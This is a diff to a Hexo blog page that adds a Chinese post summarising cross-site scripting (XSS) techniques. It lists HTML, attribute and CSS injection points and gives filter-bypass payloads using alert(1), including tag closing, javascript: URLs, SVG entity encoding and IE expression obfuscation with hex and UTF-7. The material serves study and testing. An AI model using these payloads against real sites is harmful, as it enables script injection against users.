@@ -152,6 +152,200 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/04/xss/">XSS总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/01/04/xss/" class="archive-article-date">
+  	<time datetime="2018-01-04T12:23:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-04</time>
+</a>
+        
+      </header>
+    
+
+
+    		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-XSS常见输出点"><a href="#0x01-XSS常见输出点" class="headerlink" title="0x01 XSS常见输出点"></a>0x01 XSS常见输出点</h2><ul>
+<li>HTML标签之间</li>
+<li>HTML标签之内</li>
+<li>成为JavaScript代码的值（类似后文中输出在on*事件）<ul>
+<li>闭合引号</li>
+<li>宽字节环境可采用宽字节注入或者<code>&lt;/script&gt;</code>闭合(高优先级)</li>
+</ul>
+</li>
+<li>成为CSS代码的值（类似后文中输出在style属性内）</li>
+</ul>
+<h3 id="HTML标签之间"><a href="#HTML标签之间" class="headerlink" title="HTML标签之间"></a>HTML标签之间</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"body"</span>&gt;</span>[输出]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>注：</strong> 有些标签无法执行脚本，如<code>&lt;title&gt;、&lt;textarea&gt;</code>等</p>
+<h3 id="HTML标签之内"><a href="#HTML标签之内" class="headerlink" title="HTML标签之内"></a>HTML标签之内</h3><ol>
+<li><code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot; /&gt;</code><ul>
+<li>闭合属性，payload: <code>&quot; onmouseover=&quot;alert(1);&quot; x=&quot;</code></li>
+<li>闭合标签，payload: <code>&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li>输出在src/href/action等属性内<ul>
+<li>javascript:伪协议，如<code>javascript:alert(1)//</code>,若<code>/</code>被过滤，可用JS逻辑与算数表达式代替，如<code>alert(1)-</code></li>
+<li>data:伪协议（仅IE不支持）</li>
+<li>伪协议不区分大小写</li>
+</ul>
+</li>
+<li>输出在on*事件内<ul>
+<li>具体判断输出作为on*事件的值或某个函数的参数值出现。</li>
+</ul>
+</li>
+<li>输出在style属性内<ul>
+<li>对IE，注入expression关键字并适当闭合</li>
+</ul>
+</li>
+</ol>
+<h2 id="0x02-HTML和JavaScript自解码"><a href="#0x02-HTML和JavaScript自解码" class="headerlink" title="0x02 HTML和JavaScript自解码"></a>0x02 HTML和JavaScript自解码</h2><ul>
+<li>输出的上下文环境为HTML时，可进行HTML形式的编码<ul>
+<li>进制编码：<code>&amp;#xH;、&amp;#D;</code></li>
+<li>HTML实体编码：<code>&amp;lt;</code>等</li>
+</ul>
+</li>
+<li>输出的上下文环境为JavaScript时，可进行JavaScript编码<ul>
+<li>Unicode形式：<code>\uH</code></li>
+<li>十六进制：<code>\xH</code></li>
+<li>转义：<code>\&#39;、\&quot;</code>等</li>
+</ul>
+</li>
+<li>编码可参考 <a href="https://security.yirendai.com/news/share/26" target="_blank" rel="external">XSS字符编码与浏览器解析原理</a></li>
+</ul>
+<h2 id="0x03-具备HtmlEncode功能的标签"><a href="#0x03-具备HtmlEncode功能的标签" class="headerlink" title="0x03 具备HtmlEncode功能的标签"></a>0x03 具备HtmlEncode功能的标签</h2><ul>
+<li><code>&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;</code>等具有HtmlEncode编码功能</li>
+<li><code>&lt;xmp&gt;</code>没有编码功能</li>
+<li><code>&lt;plaintext&gt;</code>在浏览器中存在差异</li>
+</ul>
+<h2 id="0x04-浏览器URL编码差异造成的XSS"><a href="#0x04-浏览器URL编码差异造成的XSS" class="headerlink" title="0x04 浏览器URL编码差异造成的XSS"></a>0x04 浏览器URL编码差异造成的XSS</h2><ul>
+<li>对’”`&lt;&gt;的编码差异</li>
+<li>对location.hash值的编码差异</li>
+</ul>
+<h2 id="0x05-HTML中的代码注入技巧"><a href="#0x05-HTML中的代码注入技巧" class="headerlink" title="0x05 HTML中的代码注入技巧"></a>0x05 HTML中的代码注入技巧</h2><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><ul>
+<li>标签大小写不敏感</li>
+<li><p>根据浏览器对XHTML的支持插入XML代码、SVG代码或未知标签</p>
+<ul>
+<li><p>如在IE6可构造</p>
+<p>  <code>&lt;XSS STYLE=&quot;xss:expression(alert(&#39;xss&#39;))&quot;&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>标签的优先级绕过过滤器</p>
+<ul>
+<li>如<code>&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;</code>和注释<code>&lt;!-- --&gt;</code>或<code>&lt;!-- --!&gt;</code>具有高优先级。</li>
+<li><p>对下面的代码，过滤器可能会认为<code>&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;</code>是属性href的值。</p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- &lt;a href="--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)//</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>- 如`&lt;! foo=&quot;&gt;&lt;script&gt;&lt;/script&gt;&quot;&gt;`
+</code></pre><ul>
+<li>IE HTML 条件控制语句<ul>
+<li>如 <code>&lt;!--[if IE 6]&gt;only IE6..test..&lt;![endif]--&gt;</code></li>
+<li>如 <code>&lt;!--[if &lt;img src=x onerror=alert(2)//]&gt; --&gt;</code></li>
+</ul>
+</li>
+<li><p><code>&lt;svg&gt;</code>标签下的<code>&lt;script&gt;</code>或其他CDATA元素会先进行XML解析,因此，可进行HTML实体编码或进制编码。</p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul>
+<li>属性大小写不敏感</li>
+<li>IE中属性可用反引号包括</li>
+<li>标签与属性、属性名与等号、等号与属性值之间可插入空格、换行符、回车符或Tab等。</li>
+<li><p>在属性值的头部和尾部（引号内）插入控制字符（ASCII值1~32),如:</p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> &amp;#<span class="attr">8</span> <span class="attr">href</span>=<span class="string">"&amp;#32javascript:alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>黑膜法：<code>&lt;input type=&quot;image&quot;</code></p>
+</li>
+</ul>
+<h2 id="0x06-CSS中代码注入技巧"><a href="#0x06-CSS中代码注入技巧" class="headerlink" title="0x06 CSS中代码注入技巧"></a>0x06 CSS中代码注入技巧</h2><ul>
+<li>大小写不敏感</li>
+<li>属性值对单双引号不敏感</li>
+<li>资源类属性的URL部分对单双引号或无引号不敏感</li>
+<li>空格可用tab、回车和换行符替代被浏览器解析</li>
+<li><p>资源类属性中通过伪协议完成XSS利用,如：</p>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">'jAvasCRipT:alert(1)'</span>);&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>behavior引入一段含JS的代码片段，不能跨域。(IE)</p>
+</li>
+<li><p>@import引入一段CSS代码</p>
+<ul>
+<li><p>可在任意地方插入<code>&#39;\&#39;</code>以及<code>&#39;\&#39;+0</code>的组合，如：</p>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@\<span class="keyword">iMp</span>\<span class="keyword">00or</span>\<span class="keyword">0T</span> <span class="string">"url"</span>;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>expression(IE7及以下版本)</p>
+<ul>
+<li><p>用注释混淆：</p>
+  <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">body&#123;xs/*zzz*/s:ex/**/press/**/ion((window.x==1)?'':eval('x=1;alert(2);'));&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>在IE6下，可用全角字符混淆：</p>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">xss</span>:exｐｒｅｓｓ<span class="built_in">ion</span>((window.x==1)?<span class="string">''</span>:<span class="built_in">eval</span>(<span class="string">'x=1;alert(2);'</span>));&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>16进制编码：<br>  <code>body{\078\073\073:\065\078\070\072\065\073\073\069\06f\06e((window.x==1)?&#39;&#39;:eval(&#39;x=1;alert(2);&#39;));}</code></p>
+</li>
+<li><p>utf-7编码：</p>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">charset</span> <span class="string">"utf-7"</span>;</div><div class="line"><span class="selector-tag">body</span>&#123;</div><div class="line"> <span class="attribute">aaa</span>:e+AHgAcABy-e+AHMAcw-i+AG8-n+ACg-if+ACgAdw-ind+AG8AdwAuAHgAIQA9ADEAKQB7AGEAbA-e+AHIAdAAoADEAKQA7AHc-ind+AG8AdwAuAHgAPQAxADsAfQApADs-</div><div class="line">&#125;</div></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/01/04/xss/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-Xdebug" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -547,7 +741,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2017 K4ng
+    		&copy; 2018 K4ng
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -638,6 +832,14 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
             
             <div class="clearfix"></div>
